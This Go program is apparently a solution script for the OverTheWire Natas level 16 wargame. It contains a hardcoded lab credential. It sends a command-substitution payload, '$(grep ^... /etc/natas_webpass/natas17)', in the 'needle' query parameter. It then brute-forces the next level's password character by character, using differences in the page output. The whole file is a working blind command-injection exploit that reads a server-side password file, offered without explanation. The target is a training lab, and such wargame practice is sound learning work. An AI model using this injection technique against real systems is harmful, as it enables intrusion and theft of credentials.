package main

import "fmt"
import "io/ioutil"
import "net/http"
import "os"
import "strings"

func doBruteforce(prefix string) string {

	var result string = ""

	base_url := "http://natas16.natas.labs.overthewire.org/"
	// grep ^0 auto converts buffer to binary!?
	charset := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	client := &http.Client{}

	for c := 0; c < len(charset); c++ {

		password := prefix + string(charset[c])
		request, _ := http.NewRequest("GET", base_url, nil)
		request.Header.Add("Content-Type", "text/html")
		request.SetBasicAuth("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")

		query := request.URL.Query()
		query.Add("needle", "$(grep ^" + password + " /etc/natas_webpass/natas17)zigzags")
		query.Add("submit", "Search")
		request.URL.RawQuery = query.Encode()

		response, err1 := client.Do(request)

		if err1 == nil {

			body, err2 := ioutil.ReadAll(response.Body)

			if err2 == nil {

				html := string(body)

				if strings.Contains(html, "<pre>\n</pre>") {

					result = password
					fmt.Println("success: " + password)
					break

				} else if strings.Contains(html, "<pre>\nzigzags\n</pre>") {

					// Do Nothing

				} else {

					fmt.Println("Auth Error? Maybe the password for natas16 changed?")
					// Meh, we are blocked probably
					break

				}

			}

		}

	}

	return result

}

func main() {

	password := ""

	buffer, err0 := os.ReadFile("password.txt")

	if err0 == nil {
		password = string(buffer)
	}

	for len(password) < 64 {

		result := doBruteforce(password)

		if result != "" {
			os.WriteFile("password.txt", []byte(result), 0666)
			password = result
		} else {
			fmt.Println(password)
			break
		}

	}

}

